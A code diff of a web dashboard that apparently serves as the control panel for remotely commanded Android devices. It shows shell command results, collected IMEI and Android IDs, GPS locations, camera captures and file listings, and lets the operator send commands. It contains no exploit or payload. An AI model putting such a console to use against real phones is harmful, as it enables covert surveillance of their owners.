+            const output = (stdout + (stderr ? '\n[stderr]\n' + stderr : '')).trim() || '(empty output)';
 
             const entry = document.createElement('div');
             entry.className = 'result-entry';
             entry.innerHTML = `
                 <div class="result-meta">
-                    📱 ${escapeHtml(result.device_id)} 
-                    ${result.command_id ? ' · #' + result.command_id.substring(0,8) : ''}
-                    · ${formatTime(result.time)}
+                    📱 ${esc(result.device_id?.substring(0,14))}...
+                    <span class="module-tag shell">shell/exec</span>
+                    ${result.command_id ? `· #${esc(result.command_id.substring(0,8))}` : ''}
+                    · ${fmtTime(result.time)}
                 </div>
-                <div class="result-data">${escapeHtml(result.data)}</div>
+                <div class="shell-output">${esc(output)}
+                ${exitCode !== undefined ? `<div class="exit-code${exitCode !== 0 ? ' nonzero' : ''}">exit code: ${exitCode}</div>` : ''}
+                </div>
             `;
-            viewer.prepend(entry);
+            prependAndScroll(feed, entry);
         }
 
-        function escapeHtml(str) {
+        function addDeviceInfoResult(result, payload) {
+            const feed = document.getElementById('result-feed');
+            clearFirstResult(feed);
+            const p = payload || {};
+
+            const rows = [
+                ['Model', p.model],
+                ['Brand', p.brand],
+                ['Manufacturer', p.manufacturer],
+                ['SDK', p.sdk],
+                ['Release', p.release],
+                ['Fingerprint', p.fingerprint],
+                ['Hardware', p.hardware],
+                ['Android ID', p.android_id],
+                ['IMEI', p.imei]
+            ].filter(([,v]) => v !== undefined && v !== null && v !== '');
+
+            const infoRowsHtml = rows.map(([label, value]) =>
+                `<div class="info-row"><span class="info-label">${esc(label)}</span><span class="info-value">${esc(String(value))}</span></div>`
+            ).join('');
+
+            const entry = document.createElement('div');
+            entry.className = 'result-entry';
+            entry.innerHTML = `
+                <div class="result-meta">
+                    📱 ${esc(result.device_id?.substring(0,14))}...
+                    <span class="module-tag info">info/gather</span>
+                    ${result.command_id ? `· #${esc(result.command_id.substring(0,8))}` : ''}
+                    · ${fmtTime(result.time)}
+                </div>
+                <div class="info-card">${infoRowsHtml || '<div style="color:var(--dim);">No device info</div>'}</div>
+            `;
+            prependAndScroll(feed, entry);
+        }
+
+        function addLocationResult(result, payload) {
+            const feed = document.getElementById('result-feed');
+            clearFirstResult(feed);
+            const p = payload || {};
+            const lat = p.lat;
+            const lng = p.lng;
+            const acc = p.accuracy;
+            const prov = p.provider;
+
+            const entry = document.createElement('div');
+            entry.className = 'result-entry';
+            entry.innerHTML = `
+                <div class="result-meta">
+                    📱 ${esc(result.device_id?.substring(0,14))}...
+                    <span class="module-tag location">location/get</span>
+                    ${result.command_id ? `· #${esc(result.command_id.substring(0,8))}` : ''}
+                    · ${fmtTime(result.time)}
+                </div>
+                <div class="location-display">
+                    📍 <span class="coords">${lat?.toFixed(6)}, ${lng?.toFixed(6)}</span>
+                    ${acc !== undefined ? ` · ±${acc.toFixed(1)}m` : ''}
+                    ${prov ? ` · via ${esc(prov)}` : ''}
+                </div>
+            `;
+            prependAndScroll(feed, entry);
+        }
+
+        function addErrorResult(result, parsed) {
+            const feed = document.getElementById('result-feed');
+            clearFirstResult(feed);
+            const errMsg = parsed?.error || parsed?.payload?.error || 'Unknown error';
+            const mod = parsed?.payload?.module || 'error';
+
+            const entry = document.createElement('div');
+            entry.className = 'result-entry';
+            entry.innerHTML = `
+                <div class="result-meta">
+                    📱 ${esc(result.device_id?.substring(0,14))}...
+                    <span class="module-tag error">${esc(mod)}/error</span>
+                    ${result.command_id ? `· #${esc(result.command_id.substring(0,8))}` : ''}
+                    · ${fmtTime(result.time)}
+                </div>
+                <div class="error-block">❌ ${esc(errMsg)}</div>
+            `;
+            prependAndScroll(feed, entry);
+        }
+
+        function addGenericResult(result, parsed, moduleName, actionName) {
+            const feed = document.getElementById('result-feed');
+            clearFirstResult(feed);
+            let prettyData;
+            if (parsed && parsed.payload && typeof parsed.payload === 'object') {
+                prettyData = JSON.stringify(parsed.payload, null, 2);
+            } else if (parsed) {
+                prettyData = JSON.stringify(parsed, null, 2);
+            } else {
+                prettyData = result.data || '';
+            }
+
+            const entry = document.createElement('div');
+            entry.className = 'result-entry';
+            entry.innerHTML = `
+                <div class="result-meta">
+                    📱 ${esc(result.device_id?.substring(0,14))}...
+                    ${moduleName ? `<span class="module-tag ${moduleName}">${esc(moduleName)}/${esc(actionName || '?')}</span>` : ''}
+                    ${result.command_id ? `· #${esc(result.command_id.substring(0,8))}` : ''}
+                    · ${fmtTime(result.time)}
+                </div>
+                <div class="result-payload">${esc(prettyData)}</div>
+            `;
+            prependAndScroll(feed, entry);
+        }
+
+        // ── Helpers ──────────────────────────────────────────────────
+        function clearFirstResult(feed) {
+            if (firstResult) {
+                feed.innerHTML = '';
+                firstResult = false;
+            }
+        }
+
+        function prependAndScroll(feed, entry) {
+            feed.insertBefore(entry, feed.firstChild);
+            feed.scrollTop = 0;
+        }
+
+        function addImageToCamera(deviceId, time, base64, format, width, height, sizeBytes) {
+            const feed = document.getElementById('camera-feed');
+            // Clear empty state
+            if (feed.querySelector('.empty-state')) feed.innerHTML = '';
+
+            const entry = document.createElement('div');
+            entry.className = 'result-entry';
+            entry.innerHTML = `
+                <div class="result-meta">
+                    📱 ${esc(deviceId?.substring(0,14))}... · <span class="module-tag camera">camera/capture</span> · ${fmtTime(time)}
+                    ${width > 0 ? `· ${width}×${height}` : ''}
+                    ${sizeBytes > 0 ? `· ${fmtSize(sizeBytes)}` : ''}
+                </div>
+                <img class="result-image" src="data:image/${(format||'jpeg').toLowerCase()};base64,${base64}" 
+                    onclick="showModal(this.src)" alt="Camera capture" title="Click to enlarge">
+            `;
+            feed.insertBefore(entry, feed.firstChild);
+        }
+
+        function addFileList(deviceId, time, entries) {
+            const feed = document.getElementById('files-feed');
+            if (feed.querySelector('.empty-state')) feed.innerHTML = '';
+
+            const entry = document.createElement('div');
+            entry.className = 'result-entry';
+
+            let tableHtml = `<div class="result-meta">📱 ${esc(deviceId?.substring(0,14))}... · <span class="module-tag files">files/list</span> · ${fmtTime(time)} · ${entries.length} entries</div>
+            <table class="file-table">
+            <thead><tr><th>Name</th><th>Size</th><th>Date</th><th>Path</th></tr></thead><tbody>`;
+
+            entries.forEach(f => {
+                const sizeStr = fmtSize(f.size);
+                const dateStr = f.date ? new Date(f.date).toLocaleString() : '—';
+                tableHtml += `<tr>
+                    <td>${esc(f.name || f.id || '?')}</td>
+                    <td>${sizeStr}</td>
+                    <td>${dateStr}</td>
+                    <td style="font-size:10px;color:#8b949e;">${esc(f.path || '')}</td>
+                </tr>`;
+            });
+
+            tableHtml += '</tbody></table>';
+            entry.innerHTML = tableHtml;
+            feed.insertBefore(entry, feed.firstChild);
+        }
+
+        function addFileFeedResult(result, entries, moduleName, actionName) {
+            const feed = document.getElementById('result-feed');
+            const entry = document.createElement('div');
+            entry.className = 'result-entry';
+
+            let tableHtml = `<div class="result-meta">📱 ${esc(result.device_id?.substring(0,14))}... · <span class="module-tag files">${esc(moduleName||'files')}/${esc(actionName||'list')}</span> · ${fmtTime(result.time)} · ${entries.length} entries</div>
+            <table class="file-table">
+            <thead><tr><th>Name</th><th>Size</th><th>Date</th><th>Path</th></tr></thead><tbody>`;
+
+            entries.forEach(f => {
+                const sizeStr = fmtSize(f.size);
+                const dateStr = f.date ? new Date(f.date).toLocaleString() : '—';
+                tableHtml += `<tr>
+                    <td>${esc(f.name || f.id || '?')}</td>
+                    <td>${sizeStr}</td>
+                    <td>${dateStr}</td>
+                    <td style="font-size:10px;color:#8b949e;">${esc(f.path || '')}</td>
+                </tr>`;
+            });
+
+            tableHtml += '</tbody></table>';
+            entry.innerHTML = tableHtml;
+            prependAndScroll(feed, entry);
+        }
+
+        // ── Tabs ────────────────────────────────────────────────────
+        function switchTab(name) {
+            document.querySelectorAll('.tab-content').forEach(t => t.classList.remove('active'));
+            document.querySelectorAll('.result-tabs button').forEach(b => b.classList.remove('active'));
+            document.getElementById('content-' + name).classList.add('active');
+            document.getElementById('tab-' + name).classList.add('active');
+        }
+
+        // ── Image modal ─────────────────────────────────────────────
+        function showModal(src) {
+            document.getElementById('modal-img').src = src;
+            document.getElementById('image-modal').classList.add('show');
+        }
+        function closeModal() {
+            document.getElementById('image-modal').classList.remove('show');
+        }
+
+        // ── Utilities ───────────────────────────────────────────────
+        function esc(s) {
+            if (!s) return '';
             const div = document.createElement('div');
-            div.textContent = str;
+            div.textContent = String(s);
             return div.innerHTML;
         }
 
-        function formatTime(iso) {
-            try {
-                return new Date(iso).toLocaleTimeString();
-            } catch(e) { return iso; }
+        function fmtTime(iso) {
+            if (!iso) return '';
+            try { return new Date(iso).toLocaleTimeString(); }
+            catch(e) { return iso; }
         }
 
-        // Init
+        function fmtSize(bytes) {
+            if (!bytes || bytes === 0) return '0 B';
+            if (bytes > 1073741824) return (bytes/1073741824).toFixed(1) + ' GB';
+            if (bytes > 1048576) return (bytes/1048576).toFixed(1) + ' MB';
+            if (bytes > 1024) return (bytes/1024).toFixed(1) + ' KB';
+            return bytes + ' B';
+        }
+
+        function toast(msg, type) {
+            const t = document.createElement('div');
+            t.className = 'toast';
+            if (type === 'success') t.style.borderColor = '#3fb950';
+            t.textContent = msg;
+            document.body.appendChild(t);
+            setTimeout(() => t.remove(), 3000);
+        }
+
+        // ── Init ────────────────────────────────────────────────────
         pollDevices();
-        setInterval(pollDevices, 2000);
+        setInterval(pollDevices, 1500);
         connectSSE();
+
+        // Keyboard shortcut: Enter in params field sends command
+        document.getElementById('cmd-params').addEventListener('keydown', function(e) {
+            if (e.key === 'Enter' && !document.getElementById('send-btn').disabled) {
+                sendCommand();
+            }
+        });
     </script>
 </body>
 </html>
